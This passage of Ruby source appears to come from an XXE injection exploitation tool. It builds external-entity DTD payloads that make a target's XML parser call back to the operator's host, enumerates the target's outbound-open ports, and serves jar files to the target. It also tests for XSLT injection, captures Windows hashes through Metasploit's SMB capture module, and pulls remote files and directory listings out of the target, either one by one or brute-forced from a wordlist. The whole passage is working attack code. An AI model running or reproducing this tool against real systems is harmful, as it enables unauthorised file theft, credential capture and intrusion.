# unfiltered ports enumeration
if enumports != ""
	ports = ""

	# enumerating all ports
	if enumports == "all"
		j = 1
		while j <= 65535  do
			$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{j}/success.dtd\">%remote;]>"
			begin
				Thread.start do
				loop do
				  enum = TCPServer.new j
  				  Thread.start(enum.accept) do
					ports += String(j) + ","
					break
				  end
				end
				end
				configreq()
				sendreq()
				j = j + 1
			rescue Errno::EADDRINUSE
				puts "Cannot bind to #{j} port."
			end
		end

	# enumerating only specified ports
	else
		tports = enumports.split(",")
		tports.each do |tcpport|
			$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{tcpport}/success.dtd\">%remote;]>"
			begin
				Thread.start do
				loop do
				  enum = TCPServer.new tcpport
  				  Thread.start(enum.accept) do
					ports += String(tcpport) + ","
					break
				  end
				end
				end
				configreq()
				sendreq()
			rescue Errno::EADDRINUSE
				puts "Cannot bind to #{tcpport} port."
			end
		end
	end
	if ports != ""
		puts "Unfiltered ports: " + ports[0..-2]
	else
		puts "No unfiltered ports were identified."
	end
	exit(1)
else
	if $direct == ""
		configreq()
	end
end

# TCP server for uploading files using Java jar
if upload != ""
	Thread.start do
	loop do
  	  Thread.start(jar.accept) do |client|
		content = IO.binread(upload)
		count = 0
		puts "File uploaded. Check temp directory on remote host for jar_cache*.tmp file. This file is available until connection is closed (CTRL+C)."
		loop do
			if count == 0
				client.puts(content)
				count = 1
			end
			sleep(10000)
		end
	  end		
	end
	end
end

# TCP server for XSLT injection test
if $xslt == "y"
	test = 0
	Thread.start do
	loop do
  	  Thread.start(xsltserv.accept) do
		puts "XSLT injection is working!"
		exit(1)
	  end		
	end
	end
	sendreq()
	sleep timeout
	puts "XSLT is not working."
	exit(1)
end

# Retriving Windows hashes
if hashes == "y"
	puts "Start msfconsole with auxiliary/server/capture/smb. Press enter when started."
	Readline.readline("> ", true)
	sendreq()
	sleep(10)
	puts "Check msfconsole for hashes."
	Readline.readline("> ", true)
	exit(1)
end

# Sending first request
if brute == ""
	if $direct == ""
		enumpath = path
		switch = 1
		puts "Enumeration locked." if $verbose == "y"
		sendreq()
	else
		done = 0
		$directpath = path
		configreq()
		sendreq()
		if !$response.body.include?("#{$direct}")
			puts "Response does not contain unique mark."
			exit(1)
		else
			if $response.body.include?("#{$direct}#{$direct}")
				puts "File/directory could not be retrieved."
				exit(1)
			else
				$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				
					
					# log to separate file or brute.log if in bruteforce mode
					logpath = "#{path}"
					logpath = logpath.gsub('\\','/')
					if logpath.include?("/")
						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
					else
						FileUtils.mkdir_p $remote + "/" + logpath
					end
					if  done == 0
						if cut == 1
							puts "Successfully logged file: /#{logpath}"
							done = 1
						else
							puts "Successfully logged file: #{logpath}"
							done = 1
						end
					end
					log = File.open($remote + "/" + "#{logpath}.log", "a")
					log.write param + "\n"
					log.close
					
					# push to array if directory listing is detected for further enumeration
					param = param.chomp
					if param.match regex
						filenames.push(param)
						puts "Path pushed to array: #{param}" if $verbose == "y"
					end

				end
			end
		end
	end

		# Loop that checks if response with next file content was received by FTP/HTTP servers
	if $direct == ""
		loop do
			sleep timeout
			if switch == 1 && hashes == "n" && upload == ""
				puts "FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
				cmp = Readline.readline("> ", true)
				Readline::HISTORY.push
				break if cmp == "n" || cmp == "N"
				sleep timeout
			else
				break
			end
		end
	end
end

# read, ask and further enumerate
loop do
	if brute == ""
		if !filenames[i].nil?
		
			# Read next line
			line = filenames[i]
			line = line.chomp
			line = line.gsub(' ','%20')
		
			# Check if a file should be enumerated
			if cut == 1
				check = "#{path}/#{line}".split("/")[0..-2].join('/')
			else
				check = "#{path}\\#{line}".split("\\")[0..-2].join('\\')
			end
			if enumall != "y" && !blacklist.include?(check)
				if cut == 0
					puts "Enumerate #{path}\\#{line} ? Y[yes]/n[no]/s[skip all files in this directory]"
				else
					if path == ""
						puts "Enumerate /#{line} ? Y[yes]/n[no]/s[skip all files in this directory]"
					else
						puts "Enumerate /#{path}/#{line} ? Y[yes]/n[no]/s[skip all files in this directory]"
					end
				end
				cmp = Readline.readline("> ", true)
				Readline::HISTORY.push
				if cmp == "s" || cmp == "S"
					if cut == 0
						blacklist.push("#{path}\\#{line}".split("\\")[0..-2].join('\\'))
					
					else
						blacklist.push("#{path}/#{line}".split("/")[0..-2].join('/'))
					end
				end
			elsif	enumall == "y"
				cmp = "y"
			else 
				cmp = "n"
			end
			if cmp == "y" || cmp == "Y" || cmp == ""
				if enumall != "y"
					switch = 1
					puts "Enumeration locked." if $verbose == "y"
				end
				nextpath = "#{line}"
	
				# Send request with next filename
				if cut == 1
					if $direct != ""
						$directpath = "#{path}/#{line}"
						configreq()
					else
						enumpath = "#{path}/#{line}"
					end
					sendreq()
				else
					if $direct != ""
						$directpath = "#{path}\\#{line}"
						configreq()
					else
						enumpath = "#{path}\\#{line}"
					end
					sendreq()
				end

				# Loop that checks if response with next file content was received by FTP/HTTP servers
				if $direct == ""
					loop do
						sleep timeout
						if switch == 1
							puts "FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n"
							cmp = Readline.readline("> ", true)
							Readline::HISTORY.push
							break if cmp == "n" || cmp == "N"
							sleep timeout
						else
							break
						end
					end
				else
					if not $response.body.include?("#{$direct}")
						puts "Response does not contain unique mark."
					else
						if $response.body.include?("#{$direct}#{$direct}")
							puts "File/directory could not be retrieved."
						else
							done = 0
							$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				

								# log to separate file or brute.log if in bruteforce mode
								logpath = "#{path}"
								logpath = logpath.gsub('\\','/')
								if logpath.include?("/")
									FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
								else
									FileUtils.mkdir_p $remote + "/" + logpath
								end
								if  done == 0
									if cut == 1
										puts "Successfully logged file: /#{logpath}"
										done = 1
									else
										puts "Successfully logged file: #{logpath}"
										done = 1
									end
								end
								log = File.open($remote + "/" + "#{logpath}.log", "a")
								log.write param + "\n"
								log.close
					
								# push to array if directory listing is detected for further enumeration
								param = param.chomp
								if param.match regex
									filenames.push(param)
									puts "Path pushed to array: #{param}" if $verbose == "y"
								end

							end
						end
					end
				end

			end
			i = i + 1
		else
			puts "Nothing else to do. Exiting."
			exit(1)
		end
	else
		brutefile = File.open(brute, "r")
		exit(1) if IO.readlines(brutefile)[i].nil?
		
		# Read next line
		line = IO.readlines(brutefile)[i]
		line = line.chomp

		log = File.open( "brute.log", "a")
		log.write "\n"
		log.write "Filename: #{line}\n"
		log.close

		# handle unix and windows paths
		if line[0] == "/"
			line[0] = ''
			cut = 1
		end
		if line[-1] == "/"
			line[-1] = ''
		end
		if line[-2..-1] == "\\\\"
			line[-2..-1] = ''
		end
		if line[-1] == "\\"
			line[-1] = ''
		end

		line = line.gsub(' ','%20')

		# Send request with next filename
		if $direct == ""
			enumpath = "#{line}"
		else
			$directpath = "#{line}"
			configreq()
		end
		sendreq()

		if $direct != ""
			if not $response.body.include?("#{$direct}")
				puts "Response does not contain unique mark." if $verbose == "y"
			else
				log = File.open("brute.log", "a")
				log.write $response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n") + "\n"
				puts "Bruteforced request logged: #{$directpath}" if $verbose == "y"
				log.close
			end
		end

		i = i + 1
		
		brutefile.close
		sleep timeout
	end
end
